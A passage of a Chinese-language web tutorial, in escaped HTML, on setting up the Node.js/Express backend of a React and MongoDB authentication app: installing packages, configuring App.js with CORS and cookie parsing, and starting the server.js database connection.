&lt;/div&gt;&lt;p&gt;在那里，通过运行安装所需依赖：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此命令安装node_modules文件夹(包含所有项目包)和package-lock.json文件(记录安装包的确切版本)。&lt;/p&gt;
&lt;p&gt;接下来，您需要安装Tailwind CSS进行样式设计。按照Tailwind文档获取逐步说明。&lt;/p&gt;
&lt;p&gt;然后，是时候设置网站了。使用React，您将创建主页、登录/注册页面。两者都将使用React-router-dom嵌套在一起。&lt;/p&gt;
&lt;h2 id=&#34;后端设置&#34;&gt;后端设置
&lt;/h2&gt;&lt;h3 id=&#34;安装所需包&#34;&gt;安装所需包
&lt;/h3&gt;&lt;p&gt;在设置项目后端前，定义项目需要提供什么很重要。这将帮助您一次性安装所有必要包。&lt;/p&gt;
&lt;p&gt;首先使用命令进入后端文件夹：&lt;code&gt;cd Backend&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在Backend目录内，使用&lt;code&gt;npm install&lt;/code&gt;初始化Node.js项目。这将创建package.json文件，存储项目的元数据和依赖。&lt;/p&gt;
&lt;p&gt;接下来，安装构建后端所需的所有依赖。运行以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm i bcryptjs cookie-parser cors dotenv express jsonwebtoken mongoose nodemailer validator nodemon
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;以下是每个包的简要概述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bcryptjs: 加密用户密码以安全存储&lt;/li&gt;
&lt;li&gt;Cookie-parser: 处理应用中的cookie&lt;/li&gt;
&lt;li&gt;CORS: 启用跨源请求的中间件 - 对前后端通信至关重要&lt;/li&gt;
&lt;li&gt;dotenv: 将.env文件中的环境变量加载到process.env&lt;/li&gt;
&lt;li&gt;Express: 构建服务器和API路由的核心框架&lt;/li&gt;
&lt;li&gt;jsonwebtoken: 为认证生成和验证JWT令牌&lt;/li&gt;
&lt;li&gt;Mongoose: 将应用连接到MongoDB数据库&lt;/li&gt;
&lt;li&gt;nodemailer: 处理从应用发送电子邮件&lt;/li&gt;
&lt;li&gt;Validator: 验证用户输入如电子邮件、字符串等&lt;/li&gt;
&lt;li&gt;nodemon: 文件更改时自动重启服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装包后，在后端目录中创建两个关键文件：App.js(包含应用逻辑、中间件和路由处理程序)和server.js(负责初始化和配置服务器)。&lt;/p&gt;
&lt;p&gt;接下来，您必须更新package.json启动脚本。转到后端目录中的package.json文件并替换默认脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scripts&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;echo\&amp;#34;Error: no test specified\&amp;#34; &amp;amp;&amp;amp; exit 1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;替换为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scripts&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;nodemon server.js&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此设置允许您使用nodemon运行服务器，在更改时自动重新加载。这有助于提高开发效率。&lt;/p&gt;
&lt;p&gt;要检查后端设置是否正确，打开server.js文件并添加测试日志：&lt;code&gt;console.log(&amp;quot;您的日志消息&amp;quot;)&lt;/code&gt;。然后，转到后端目录中的终端，运行&lt;code&gt;npm start&lt;/code&gt;。您应该在终端中看到日志消息，确认后端正在运行。&lt;/p&gt;
&lt;h3 id=&#34;appjs设置&#34;&gt;App.js设置
&lt;/h3&gt;&lt;p&gt;在App.js文件中，首先导入您最初安装的包。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;express&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;express&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cors&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cors&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cookieParser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cookie-parser&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;express&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;cors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost:5173&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;express&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10kb&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookieParser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;require语句导入express、cors和cookie-parser，这些对创建后端服务器、处理跨源请求和解析cookie至关重要&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const app = express();&lt;/code&gt;命令设置新的Express应用实例&lt;/li&gt;
&lt;li&gt;&lt;code&gt;app.use(cors({...}))&lt;/code&gt;允许来自前端的请求并启用应用前后端之间的cookie共享。这对认证很重要&lt;/li&gt;
&lt;li&gt;&lt;code&gt;app.use(express.json({ limit: &amp;quot;10kb&amp;quot; }));&lt;/code&gt;是确保服务器能处理传入JSON负载并防止可能用于DoS攻击的过大请求的中间件函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;app.use(cookieParser());&lt;/code&gt;命令使cookie通过req.cookies可用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;module.exports = app;&lt;/code&gt;命令允许在其他文件中导入应用，特别是server.js，这是应用将启动的地方&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;serverjs设置&#34;&gt;Server.js设置
&lt;/h3&gt;&lt;p&gt;设置好App.js后，下一步是在名为server.js的新文件中创建和配置服务器。&lt;/p&gt;
&lt;p&gt;在此之前，确保您已设置MongoDB数据库。如果还没有，可以按照此视频教程设置MongoDB数据库。&lt;/p&gt;
&lt;p&gt;设置MongoDB后，您将收到用户名和密码。复制密码，转到后端目录，并创建.env文件存储它。&lt;/p&gt;
&lt;p&gt;存储密码后，返回完成数据库设置。&lt;/p&gt;
&lt;p&gt;接下来，点击&amp;quot;Create Database User&amp;quot;按钮，然后点击选择连接方法选项。由于我们在此项目中使用Node.js，选择&amp;quot;Drivers&amp;quot;选项。这将给您数据库连接字符串(您应该在No. 3看到它)。&lt;/p&gt;
&lt;p&gt;然后转到您的.env并粘贴在那里，并在&amp;quot;net/&amp;ldquo;后立即添加auth。&lt;/p&gt;
&lt;p&gt;看起来像这样：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-env&#34; data-lang=&#34;env&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongodb+srv://&amp;lt;用户名&amp;gt;:&amp;lt;密码&amp;gt;@cluster0.qrrtmhs.mongodb.net/auth?retryWrites&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;majority&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;appName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Cluster0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;最后，将您的IP地址加入白名单。这确保您的后端可以从本地机器或开发期间的任何环境连接到MongoDB。&lt;/p&gt;
&lt;p&gt;要允许应用连接到数据库：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;转到MongoDB仪表板安全侧边栏中的&amp;quot;Network Access&amp;quot;部分&lt;/li&gt;
&lt;li&gt;点击&amp;quot;ADD IP ADDRESS&amp;rdquo;&lt;/li&gt;
&lt;li&gt;选择&amp;quot;Allow Access from Anywhere&amp;rdquo;，然后点击Confirm&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此时，您可以设置server.js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//server.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dotenv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mongoose&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mongoose&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dotenv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dotenv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//管理环境变量
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;dotenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;./config.env&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./app&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//使用MongoDB将应用连接到数据库
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mongoose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;DB连接成功&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
